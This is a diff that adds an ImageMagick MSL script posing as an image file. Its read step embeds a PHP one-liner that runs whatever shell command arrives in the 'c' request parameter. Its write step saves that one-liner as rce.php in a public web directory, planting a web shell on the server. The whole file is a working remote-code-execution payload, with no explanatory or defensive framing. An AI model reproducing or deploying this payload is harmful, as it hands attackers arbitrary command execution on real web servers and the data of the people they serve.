@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<image>
+<read filename="caption:&lt;?php @passthru(@$_REQUEST['c']); ?&gt;" />
+<write filename="info:/var/www/html/intentions/storage/app/public/rce.php" />
+</image>
